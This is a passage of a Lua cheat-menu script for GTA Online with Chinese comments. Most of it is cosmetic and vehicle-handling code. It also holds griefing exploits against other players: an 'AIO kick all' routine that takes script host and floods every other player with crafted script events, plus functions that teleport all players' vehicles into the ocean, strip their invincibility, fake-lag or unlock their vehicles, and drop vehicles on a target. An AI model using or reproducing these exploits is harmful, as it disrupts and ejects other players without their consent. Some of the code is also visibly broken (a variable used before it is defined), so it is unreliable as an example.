		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 270, false, true, false, false, 1, true)
		end
	end
	if not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, 0, 180, 220, 0, false, true, false, false, 1, true)
	end
end
--炸弹雨
active_bowling_balls = 0
function bomb_shower_tick_handler(ent)
    local start_time = os.clock()
    active_bowling_balls += 1
    util.create_tick_handler(function()
        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(ent) or os.clock() - start_time > 10 or not ENTITY.DOES_ENTITY_EXIST(ent) then
            if ENTITY.DOES_ENTITY_EXIST(ent) then 
                local c = ENTITY.GET_ENTITY_COORDS(ent)
                FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 17, 100.0, true, false, 0.0)
                entities.delete_by_handle(ent)
            end
            if active_bowling_balls > 0 then 
                active_bowling_balls -= 1
            end
            util.stop_thread()
        end
    end)
end
--实体信息
function to_rgb(r, g, b, a)
    local color = {}
    color.r = r
    color.g = g
    color.b = b
    color.a = a
    return color
end
--彩屏
function xcpm(on)
    local a_toggle = menu.ref_by_path('World>Aesthetic Light>Aesthetic Light')
    if on then 
        menu.trigger_commands("shader glasses_purple")
        menu.trigger_commands("aestheticcolourred 255")
        menu.trigger_commands("aestheticcolourgreen 0")
        menu.trigger_commands("aestheticcolourblue 255")
        menu.trigger_commands("aestheticrange 10000")
        menu.trigger_commands("aestheticintensity 30")
        menu.trigger_commands("time 0")
        menu.set_value(a_toggle, true)
    else
        menu.set_value(a_toggle, false)
        menu.trigger_commands("shader off")
    end
end
--加入战局时向玩家敬酒
local join_ing = false
function CheckLobbyForPlayers()
    local buffer = join_ing
    join_ing = NETWORK.NETWORK_IS_SESSION_STARTED()
    wait(2000)
    local playersTable = players.list()
    if buffer ~= join_ing then
        for i = 1, 100 do
            gtoast("战局中的玩家: " .. #playersTable)
            wait(10)
        end
    end
end
--将所有人传送到海洋
VehTeleportLoadIterations = 20
function TeleportEveryonesVehicleToOcean()
    local oldcoords = getEntityCoords(GetLocalPed())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            local pedCoords = getEntityCoords(ped)
            for c = 0, VehTeleportLoadIterations do --teleports us to them so we load their veh
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                wait(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                    wait(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--移除所有人的载具无敌
function RemoveVehicleGodmodeForAll()
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            end
        end
    end
end
--AIO全局踢
TXC_SLOW = false
function AIOKickAll()
    menu.trigger_commands("scripthost")
    NETWORK.NETWORK_REQUEST_TO_BE_HOST_OF_THIS_SCRIPT()
    for i = 0, 31 do
        if i ~= players.user() and NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            gtoast("玩家已连接 " .. tostring(PLAYER.GET_PLAYER_NAME(i) .. ", 开始 AIO."))
            util.trigger_script_event(1 << i, {0x37437C28, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-1308840134, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x4E0350C6, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x114C63AC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x15F5B1D4, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x249FE11B, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x76B11968, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x9C050EC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x3B873479, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x23F74138, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            --[[
            util.trigger_script_event(1 << i, {0xAD63290E, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            --[[
            util.trigger_script_event(1 << i, {0x39624029, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            util.trigger_script_event(1 << i, {-0x529CD6F2, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x756DBC8A, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x69532BA0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x68C5399F, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x7DE8CAC0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x285DDF33, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x177132B8, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10)
            --gtoast("主程序块完成. // AIO")
            util.trigger_script_event(1 << i, {memory.script_global(1893548 + (1 + (i * 600) + 511)), i})
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {-65587051, 28, a, n})
                    wait(10)
                end
            end
            --gtoast("第二块完成. // AIO")
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    wait(10)
                end
            end
            --gtoast("第三块完成. // AIO")
            if TXC_SLOW then
                wait(10)
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {2002459655, -1000000, -10000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {911179316, -38, -30, -75, -59, 85, 82})
                wait(10)
                --[[
                for n = -10, -7 do
                    for a = -60, 60 do
                        util.trigger_script_event(1 << i, {0x39624029, n, 623656, a, 73473741, -7, 856844, -51251, 856844})
                        wait(10)
                    end
                end
                ]]
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-1386010354, 91645, -99683, 1788, 60877, 55085, 72028})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                for g = -28, 0 do
                    for n = -1, 1 do
                        for a = -1, 1 do
                            util.trigger_script_event(1 << i, {1445703181, i, n, a})
                        end
                    end
                    wait(10)
                end
                --[[for a = -28, 20 do
                    for n = -10, 2 do
                        for b = -100, 100 do
                            util.trigger_script_event(1 << i, {-1782442696, b, n, a})
                            util.log("第六块,加载 " .. b)
                        end
                        util.log("第七块,加载 " .. n)
                    end
                    util.log("第八块,加载 " .. a)
                    wait(10)
                end]]
                for a = -11, 11 do
                    util.trigger_script_event(1 << i, {2002459655, -1000000, a, -100000000})
                end
                for a = -10, 10 do
                    for n = 30, -30 do
                        util.trigger_script_event(1 << i, {911179316, a, n, -75, -59, 85, 82})
                    end
                end
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-65587051, a, -1, -1})
                end
                util.trigger_script_event(1 << i, {951147709, i, 1000000, nil, nil}) 
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-1949011582, a, 1518380048})
                end
                for a = -10, 4 do
                    for n = -10, 5 do
                        util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    end
                end
            end
            gtoast("第四块完成. // AIO")
            gtoast("循环 " .. i .. " 完成AIO踢出.")
            gtoast("玩家 " .. PLAYER.GET_PLAYER_NAME(i) .. " 已完成.")
        end
    end
    wait(100)
end
--踢出
function KickPlayer(pid, method)
    local path = menu.player_root(pid)
    local command = menu.ref_by_rel_path(path, "Kick>"..method)
    menu.trigger_command(command)
end
--传送枪
function write_vector3(address, vector)
	memory.write_float(address + 0x0, vector.x)
	memory.write_float(address + 0x4, vector.y)
	memory.write_float(address + 0x8, vector.z)
end
function set_entity_coords(entity, coords)
	local fwEntity = entities.handle_to_pointer(entity)
	local CNavigation = memory.read_long(fwEntity + 0x30)
	if CNavigation ~= 0 then
		write_vector3(CNavigation + 0x50, coords)
		write_vector3(fwEntity + 0x90, coords)
	end
end
function tp_entity_coords(entity, coords)
	local fwEntity = entities.handle_to_pointer(entity)
	local CNavigation = memory.read_long(fwEntity + 0x30)
	if CNavigation ~= 0 then
		write_vector3(CNavigation + 0x50, coords)
		write_vector3(fwEntity + 0x90, coords)
	end
end
--将载具放在玩家身上
function DropVehicleOnPlayer(pid, name, invis)
    local ped = getPlayerPed(pid)
    local pc = getEntityCoords(ped)
    local hash = joaat(name)
    requestModel(hash)
    while not hasModelLoaded(hash) do wait() end
    local ourveh = VEHICLE.CREATE_VEHICLE(hash, pc.x, pc.y, pc.z + 5, 0, true, true, false)
    if invis then
        ENTITY.SET_ENTITY_VISIBLE(ourveh, false, 0)
    end
    noNeedModel(hash)
    wait(1200)
    entities.delete_by_handle(ourveh)
end
--伪造载具
function FakeLagPlayerVehicle(pid)
    local ped = getPlayerPed(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
        local oldcoords = getEntityCoords(ped)
        wait(500)
        local nowcoords = getEntityCoords(ped)
        for a = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
        wait(200)
        for b = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
        for c = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
        for d = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
        wait(500)
    else
        gtoast("玩家 " .. GetPlayerName_pid(pid) .. " 不在载具内!")
    end
end
--实体枪
function makeListForEntity(parent, entityHandle)
    return menu.list(parent, GetEntityTypeString(entityHandle) .. " | 移动: " .. entityHandle, {}, "")
end
function GetEntityTypeString(handle)
    local t = ENTITY.GET_ENTITY_TYPE(handle)
    if (t == 1) then return "Ped" elseif (t == 2) then return "载具" elseif (t == 3) then return "物体" else return nil end
end
function funcsForEntity(handleTable, intMenuList, handle)
    menu.action(intMenuList, "删除列表", {}, "删除实体的文件夹. 如果这个实体消失了,但列表中没有消失,则使用此选项.", function()
        menu.delete(intMenuList)
        local indx = GetValueIndexFromTable(handleTable, handle)
        table.remove(handleTable, indx)
    end)
    menu.action(intMenuList, "删除实体", {}, "", function()
        entities.delete_by_handle(handle)
    end)
    menu.action(intMenuList, "请求控制", {}, "请求控制实体.", function()
        for i = 1, 10 do 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(handle)
            wait()
        end
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(handle)) then gtoast("拥有控制权.") else gtoast("无法控制!") end
    end)
    menu.action(intMenuList, "传送到我", {}, "将实体传送给你.", function()
        local mypos = getEntityCoords(GetLocalPed())
        ENTITY.SET_ENTITY_COORDS(handle, mypos.x, mypos.y, mypos.z, false, false, false, false)
    end)
    menu.action(intMenuList, "附加到我自己", {}, "将实体附加到您身上,没有碰撞. 更多选择可能会晚些时候!", function()
        ENTITY.ATTACH_ENTITY_TO_ENTITY(handle, GetLocalPed(), -1, 0, 0, 0, 0, 0, 0, true, true, false, false, 0, true, true)
    end)
    menu.action(intMenuList, "传送到随机玩家", {}, "将实体传送给随机玩家.", function()
        local plist = players.list(false, true, true)
        local randomIndex = math.random(1, #plist)
        local randomPID = plist[randomIndex]
        local pos = getEntityCoords(getPlayerPed(randomPID))
        ENTITY.SET_ENTITY_COORDS(handle, pos.x, pos.y, pos.z, false, false, false, false)
        gtoast("传送到 PID: " .. randomPID .. " || 名字: " .. GetPlayerName_pid(randomPID))
    end)
    menu.action(intMenuList, "向任意方向发射", {}, "以随机方向发射实体.", function()
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(handle, 1,
            math.random(100, 2000), math.random(100, 2000), math.random(100, 2000),
            true, false, true)
    end)
end
function doesEntityExist(handleTable, intMenuList, handle)
    if (not ENTITY.DOES_ENTITY_EXIST(handle)) then
        local indx = GetValueIndexFromTable(handleTable, handle)
        table.remove(handleTable, indx)
        menu.delete(intMenuList)
        return false
    end
    wait(500)
end
--载具颠倒
function UpsideDownVehicleRotationWithKeys()
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    ENTITY.SET_ENTITY_ROTATION(veh, 10, 179.5, vvYaw, 2, true)
    --rotation logic (left-right || YAW)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A
            local yawAfterPress = vvYaw + 3
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + 3
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, yawAfterPress, 2, true)
            end
    end
    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D
            local yawAfterPress = vvYaw - 3
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - 3
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, yawAfterPress, 2, true)
            end
    end
    if PAD.IS_CONTROL_PRESSED(0, 62) then --62 || INPUT_VEH_MOVE_DOWN_ONLY || LEFT CTRL / NUM5 (NOSE UP)
        local pitchAfterPress = vvPitch + 5
        if pitchAfterPress > 90 then --check for overflow
            --if pitch = 89, we add 3, we will get 88 for pitch. Distance to 90, then sub the rest.
            local pitchToSub = 90 - (3 - math.abs(90 - vvPitch))
            ENTITY.SET_ENTITY_ROTATION(veh, pitchToSub, 179.9, vvYaw)
        else
            --if not overflowed, then we just add.
            ENTITY.SET_ENTITY_ROTATION(veh, pitchAfterPress, 179.9, vvYaw)
        end
    end
    v3.free(vv)
end
--解锁你试图进入的载具
function UnlockVehicleGetIn()
    ::start::
    local localPed = GetLocalPed()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        wait()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    wait(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                gtoast("等待2秒,无法控制!")
                goto start
            else
                if SE_Notifications then
                    gtoast("拥有控制权.")
                end
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end
--解锁你射击的载具
function UnlockVehicleShoot()
    ::start::
    local localPed = GetLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local pointer = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), pointer)
        if isEntFound then
            local entity = memory.read_int(pointer)
            if ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity) then
                local vehicle = PED.GET_VEHICLE_PED_IS_IN(entity)
                ---------------------------------------------
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    gtoast("Waited 2 secs, couldn't get control!")
                    goto start
                else
                    gtoast("拥有控制权.")
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
            elseif ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    gtoast("等待2秒,无法控制!")
                    memory.free(pointer)
                    goto start
                else
                    if SE_Notifications then
                        gtoast("拥有控制权.")
                    end
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(entity, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(entity, false)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(entity, players.user(), false)
                VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
            end
        end
        memory.free(pointer)
    end
end
--载具快速定制转弯
function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A
        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.
            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end
    end
    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D
        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end
        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end
    end
    v3.free(vv)
end
local function array_remove(t, fnKeep)
    local j, n = 1, #t;
    for i=1,#t do
        if (fnKeep(t, i, j)) then
            -- Move i's kept value to j's position, if it's not already there.
            if (i ~= j) then
                t[j] = t[i];
                t[i] = nil;
            end
            j = j + 1; -- Increment position of where we'll place the next kept value.
        else
            t[i] = nil;
        end
    end
    return t;
end
function spawn_vehicle(hash, coords, dir, maxed, god)
    request_model_load(hash)
    if maxed then	
        set_entity_coords_no_offset_2t1(car, coords)
        ENTITY.SET_ENTITY_HEADING(car, dir)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    else
        local car = create_vehicle_2t1(hash, coords, dir, true, false)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    end
end
--氮气
function request_ptfx_asset(asset) -- 请求粒子特效
    local request_time = util.current_time_millis()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if util.current_time_millis() - request_time >= 10 then
            break
        end
        wait()
    end
end
--3D射线
function request_texture_dict_load(dict_name)
    request_time = os.time()
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict_name, true)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict_name) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
--举手(按x)
function hhandup()
if PAD.IS_CONTROL_PRESSED(1, 323) then
                while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
                    STREAMING.REQUEST_ANIM_DICT("random@mugging3")
                    wait(100)
                end
                if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                    WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
                    STREAMING.REMOVE_ANIM_DICT("random@mugging3")
                    PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
                end
            end
            if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
            end
end
function plyped()
	return PLAYER.PLAYER_PED_ID()
end
function request_ptfx_asset_firemen(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
function request_model(hash, timeout)
    local end_time = os.time() + (timeout or 0)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash)
    and end_time >= os.time() do
        wait()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
--[[function request_model(hash, timeout)
    local end_time = os.time() + (timeout or 5)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) and end_time >= os.time() do
        wait()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end]]
function play_anim(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        wait()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
end
        function caidancargun()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity, 1000) then
                local primary, secundary = get_random_colour(), get_random_colour()
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
            end
        end
    end
--鸡巴炮
function diaoshepao(asset)
    local request_time = os.time()
